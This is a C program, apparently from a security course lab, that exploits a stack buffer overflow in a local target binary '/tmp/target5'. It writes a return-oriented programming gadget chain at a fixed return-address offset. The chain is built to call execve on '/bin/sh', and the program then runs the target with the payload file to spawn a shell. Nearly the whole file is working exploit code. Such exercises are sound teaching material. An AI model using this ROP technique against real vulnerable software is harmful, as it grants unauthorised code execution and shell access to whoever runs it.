#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target5"
#define DEFAULT_OUTPUT "/tmp/xploit5_output"

// Length of the exploit file
#define BUFFER_LEN 512

// Distance between buffer address and dangerous "foo" function return address (in stack)
#define RETURN_OFFSET (300 + 4 + sizeof(void*))

// Address of "/bin/sh" zero-terminated string from "get_shell" function.
#define SHELL_ASCIIZ 0x4d9000

// Gadgets address array with arguments, all cast to the pointer length.
#define GADGET_SET {           \
  (void*) 0x485d4b,            \
  (void*) 0x0000000000000000,  \
  (void*) 0x4883a9,            \
  (void*) 0x0000000000000000,  \
  (void*) 0x48d204,            \
  (void*) SHELL_ASCIIZ,        \
  (void*) 0x49efa6,            \
  (void*) 0x000000000000003b,  \
  (void*) 0x4874ea             \
}

int main(int argc, char *argv[])
{
  // TODO determine exploit length
  char exploit[BUFFER_LEN];

  // TODO fill exploit buffer
  memset(exploit, 0, sizeof(exploit));

  void* addresses[] = GADGET_SET;
  memcpy(&exploit[RETURN_OFFSET], addresses, sizeof(addresses));

  // Write the exploit buffer to a file
  write_xploit(exploit, sizeof(exploit), DEFAULT_OUTPUT);

  char *args[] = { TARGET, DEFAULT_OUTPUT, NULL };
  char *env[] = { NULL };
  execve(TARGET, args, env);
  perror("execve failed");

  return 0;
}
